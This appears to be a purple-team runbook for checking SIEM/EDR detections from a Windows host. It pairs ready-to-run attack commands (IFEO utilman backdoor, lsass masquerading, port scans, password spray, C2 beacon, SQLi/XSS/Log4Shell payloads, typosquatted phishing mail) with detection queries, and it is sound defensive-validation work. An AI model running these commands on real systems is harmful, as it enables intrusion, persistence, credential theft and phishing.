# TDA Detection-Validation Methodology — Final (Windows)

Purple-team methodology to validate SIEM/EDR detections from a **Windows machine
with admin rights**, where **Halcyon blocks downloads** → built-in tools + browser
only. Run in **PowerShell as Administrator**. Authorized scope only.

## How to read every result (the core principle)

For each test there are **two different outcomes** — don't confuse them:

| Outcome | Meaning | How it shows |
|---|---|---|
| **DETECTION** | the control **saw and alerted** on the activity | SIEM/EDR raises an alert |
| **PREVENTION** | the control **blocked** the activity | the action is stopped (Halcyon/WAF/Request Validation) |

**Both are a PASS.** A **GAP** is only when the activity runs *and nothing is
logged or alerted*.

> ⚠️ **IMPORTANT — blocked activity does not "fire" the attack.**
> If Halcyon, a WAF, or ASP.NET Request Validation **blocks** the action, the
> attack **never executes** — so the exploit/behaviour-based alert (e.g. an XSS
> popup, a spawned process, a beacon) **will NOT trigger**. That block is a
> **prevention PASS**, not a failure. So for every test ask:
> 1. Did it **run**? (if blocked → record as prevented, screenshot the block)
> 2. If it ran, was it **detected**? (check SIEM)
> This was proven on the web app: `<svg>` XSS was blocked by ASP.NET Request
> Validation → no popup, because the payload never reached the app.

## Setup (once, Admin PowerShell)
```powershell
auditpol /set /subcategory:"Process Creation" /success:enable   # enable 4688 process logging
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'           # for HTTPS/web tests
Get-Date -Format "yyyy-MM-dd HH:mm:ss"; hostname; ipconfig | findstr IPv4   # your marker
```
Record UTC time + source IP before each test. Announce to SOC. Clean up after.

---

# A. HOST / ENDPOINT

## UC0032 — Critical Malware on EDR
**Method:** write the EICAR test file (safe industry-standard "malware") to disk and read it.
```powershell
$e='X5O!P%@AP[4'+'\PZX54(P^)7CC)7}'+'$EICAR-STANDARD-'+'ANTIVIRUS-TEST-FILE!$H+H*'
Set-Content "$env:TEMP\eicar.com" -Value $e -Encoding Ascii; Get-Content "$env:TEMP\eicar.com"
```
**Expected:** EDR detects/quarantines `EICAR-Test-File`. If Halcyon deletes it on
write = **prevention PASS**. Cleanup: `Remove-Item "$env:TEMP\eicar.com" -Force`

## UC0149 — Multiple AV Infections on Same Host
**Method:** drop several EICAR files → multiple detections on one host.
```powershell
1..5 | % { Set-Content "$env:TEMP\eicar_$_.com" -Value $e -Encoding Ascii }
Get-ChildItem "$env:TEMP\eicar_*.com" | % { Get-Content $_.FullName | Out-Null }
```
**Detect:** `("EICAR" OR "Test-File") | stats dc(file_path) by host | where >=2`

## UC0125 — Ransomware Extensions
**Method:** mass-rename files to known ransomware extensions + drop a ransom note.
```powershell
$dir="$env:TEMP\ransom"; mkdir $dir -Force|Out-Null
$ext=".locky",".crypt",".encrypted",".wncry",".cerber"
1..20 | % { $f="$dir\doc$_.txt"; "x"|Set-Content $f; Rename-Item $f "$dir\doc$_$($ext[$_%$ext.Count])" }
"Your files are encrypted."|Set-Content "$dir\READ_ME_DECRYPT.txt"
```
Cleanup: `Remove-Item $dir -Recurse -Force`

## UC0036 — APT Process Creation (Masquerading)
**Method:** copy `cmd.exe` → `lsass.exe` in a non-system path and run it (process name/path mismatch).
```powershell
Copy-Item C:\Windows\System32\cmd.exe C:\Windows\Temp\lsass.exe
Start-Process C:\Windows\Temp\lsass.exe
Get-Process lsass | Select Id,Path,StartTime
```
**Detect (4688):** `New_Process_Name="*lsass.exe"` with path `C:\Windows\Temp`.
If EDR kills it on launch = **prevention PASS**.
Cleanup: `Stop-Process -Name lsass -Force -EA 0; Remove-Item C:\Windows\Temp\lsass.exe -Force -EA 0`

## UC0182 — Application Parent Spawning Malicious Child
**Method:** script host (`wscript.exe`) spawns `cmd.exe`.
```powershell
Set-Content "$env:TEMP\u.vbs" 'CreateObject("WScript.Shell").Run "cmd.exe /c whoami > %TEMP%\u.txt"'
wscript.exe "$env:TEMP\u.vbs"
```
**Detect (4688):** `Creator_Process_Name="*wscript.exe"` → `New_Process_Name="*cmd.exe"`.

## UC0185 — Abuse of Accessibility Binaries
**Method:** set an IFEO Debugger on `utilman.exe`/`sethc.exe` (registry backdoor). The
**registry write is the detection** (not the popup).
```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger
```
**Note (blocked-activity rule):** if the `reg query` says "not found" right after
`reg add`, Halcyon **stripped the key = prevention PASS** (the backdoor never
persists, so triggering utilman won't open cmd). Cleanup: `reg delete "...utilman.exe" /v Debugger /f`

## SPLUC0187 — Scheduled Task Spawning a Shell
**Method:** create + run a task that launches cmd.
```powershell
$a=New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami"
Register-ScheduledTask -TaskName "uc0187" -Action $a -Force
Start-ScheduledTask -TaskName "uc0187"
Unregister-ScheduledTask -TaskName "uc0187" -Confirm:$false
```
**Detect (4688/4698):** task creation + Task Scheduler (`svchost.exe`) → `cmd.exe`.

## UC0043 — Threat Activity (recon burst)
**Method:** run many discovery commands quickly.
```powershell
whoami /all; net user; net group "domain admins" /domain; systeminfo; tasklist; nltest /domain_trusts
```
**Detect:** burst of discovery processes from one host (4688).

---

# B. NETWORK (from Windows; nmap is a download so use native if blocked)

## UC0053 — Horizontal Port Scan (one port, many hosts)
```powershell
$port=445
"172.16.75","172.16.5" | % { $s=$_; 1..254 | % { $ip="$s.$_"; $t=New-Object Net.Sockets.TcpClient; $c=$t.BeginConnect($ip,$port,$null,$null); if($c.AsyncWaitHandle.WaitOne(120)){"$ip OPEN"; try{$t.EndConnect($c)}catch{}}; $t.Close() } }
```
**Detect (firewall):** `stats dc(dest_ip) by src | where >=51`. (If nmap allowed: `nmap -sS -Pn -n -p445 172.16.75.0/24`.)

## UC0054 — Vertical Port Scan (many ports, one host)
```powershell
$ip="<TARGET>"; 1..1024 | % { $p=$_; $t=New-Object Net.Sockets.TcpClient; $c=$t.BeginConnect($ip,$p,$null,$null); if($c.AsyncWaitHandle.WaitOne(120)){"$p OPEN"; try{$t.EndConnect($c)}catch{}}; $t.Close() }
```
**Detect (firewall):** `stats dc(dest_port) by dest | where >=100`.

## UC0249 — Prohibited Port Activity
```powershell
$ip="<TARGET>"; 23,6667,4444 | % { (Test-NetConnection $ip -Port $_ -WarningAction 0)|Select RemoteAddress,RemotePort,TcpTestSucceeded }
```
**Detect:** firewall/proxy session to a forbidden port.

## UC0141 — C2 / Command-and-Control (self-hosted lab server)
**Method:** host a listener on a **2nd Windows lab box**, beacon to it.
*On the server:* `New-NetFirewallRule -DisplayName TDA-C2 -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow` (needed even on same subnet — Windows blocks inbound by default), then start a PowerShell `HttpListener` on :8080.
*On the test box:*
```powershell
$c2="http://<C2_IP>:8080/beacon"; 1..30 | % { try{Invoke-WebRequest $c2 -UseBasicParsing -TimeoutSec 5 -Headers @{ "User-Agent"="beacon" }|Out-Null}catch{}; Start-Sleep 10 }
```
**Detect (proxy/firewall):** regular, repeated src→dest on a fixed interval.

## UC0046 — Password Spray
```powershell
(net user /domain)|Out-File "$env:TEMP\users.txt"
$users=gc "$env:TEMP\users.txt"|?{$_ -match '^\S'}; $pw="Winter2026!"
foreach($u in $users){ cmd /c "net use \\<DC>\IPC$ /user:$u $pw" 2>$null; Start-Sleep -m 300 }
```
**Detect:** `EventCode=4625 | stats dc(user) by src | where >=10`. (Agree accounts/password to avoid lockouts.)

---

# C. WEB APPLICATION (⚠️ blocked = no alert)

> **Key caveat:** web defenses (WAF / ASP.NET Request Validation) may **block the
> payload before it reaches the app**. When that happens the attack does NOT
> execute (no XSS popup, no injection result) — that block **is a prevention
> PASS**. Always confirm whether your payload actually **reached and ran**, vs. was
> **blocked**. (Proven on CivilSoft HCMS: `<svg>` XSS → blocked by Request
> Validation → no popup.)

## UC0228 — SQL Injection
**Method:** submit SQLi patterns in login/params. Request Validation does **not**
block SQL metacharacters, so these reach the app.
```powershell
$u="https://<WEBAPP>/M/Home/Authenticate"
"admin' OR '1'='1","admin'--","' OR 1=1--" | % { try{Invoke-WebRequest $u -Method POST -Body @{userName=$_;password="x"} -UseBasicParsing}catch{} }
```
**Interpret:** SQL error / auth bypass = vuln; WAF block page = **prevention PASS**;
check WAF/SIEM for the SQLi signature either way.

## UC0229 — Web Application Exploit
**Method:** send OWASP attack patterns to parameters (needs a param like `?id=`/`?file=`).
```powershell
$b="https://<WEBAPP>"
@("/?q=<script>alert(1)</script>","/?file=../../../../windows/win.ini","/?cmd=;whoami",'/?x=${jndi:ldap://127.0.0.1/a}') | % { try{Invoke-WebRequest "$b$_" -UseBasicParsing -TimeoutSec 8}catch{} }
```
**Interpret:** blocked (WAF/Request Validation) = **prevention PASS**, no exploit
fires; if it reaches the app, check for the result + the WAF/SIEM alert. XSS only
"pops" if it actually renders unescaped — a block means it won't.

---

# D. EMAIL / DLP (needs SMTP relay + target mailbox)

## UC0222 — Malicious Attachment / Mail Malware
```powershell
Copy-Item C:\Windows\System32\calc.exe "$env:TEMP\invoice.exe"
Send-MailMessage -From "t@lab.local" -To "<victim@customer.com>" -Subject "Invoice" -Body "." -Attachments "$env:TEMP\eicar.com","$env:TEMP\invoice.exe" -SmtpServer "<SMTP>"
```
**Detect:** mail AV/extension rule. If mail gateway strips it = **prevention PASS**.

## SPLUC0107 — Phishing Email
```powershell
Send-MailMessage -From "security-alert@micros0ft-support.com" -To "<victim@customer.com>" -Subject "URGENT: account suspended" -Body "Verify: http://<LAB_PHISH>/login" -SmtpServer "<SMTP>"
```

## UC0575 — Multiple DLP Violations
Create files with fake PII (CC/SSN), send each through the DLP-monitored channel
multiple times → ≥2 violations for the user.

---

# E. CLOUD — Azure / M365 (browser, no download)

| UC | Method (in the portal) |
|---|---|
| **UC0458** Azure CRUD | Resource groups → Create `tda-rg` → add tag → Delete → check Activity Log |
| **UC0215** Explicit MFA Deny | sign in to portal.office.com → **Deny** the MFA push → Entra sign-in logs |
| **UC0327** Privileged outside PIM | assign a privileged role permanently (not via PIM) → admin action → Entra audit |
| **M365 Password Spray** | login.microsoftonline.com → one password across a few test accounts |
| **Malicious MFA Takeover** | spam push prompts (fatigue) or register a new MFA method at aka.ms/mfasetup |

---

# F. FIREWALL

## UC0110 — Privilege Change on Firewall (on the firewall itself)
- Palo Alto: `set mgt-config users tdatest permissions role-based superuser yes` → `commit`
- Fortinet: `config system admin` → `edit tdatest` → `set accprofile super_admin` → `end`
**Detect:** firewall admin/audit log shows the privilege change.

---

## Per-test workflow (apply to every case)
1. Note UTC time + source. Announce to SOC.
2. Run the activity.
3. **Did it run or was it blocked?**
   - **Blocked** (Halcyon/WAF/Request Validation) → **prevention PASS** — screenshot the block.
   - **Ran** → go to 4.
4. Check SIEM/EDR for the **detection** alert.
5. Record **DETECTED / PREVENTED / GAP** (gap = ran + nothing logged).
6. Clean up artifacts.

*Built-in tools only (no downloads). Fake test data + lab-controlled hosts only.
A block is a PASS, not a failure — just confirm which (detection vs prevention).*
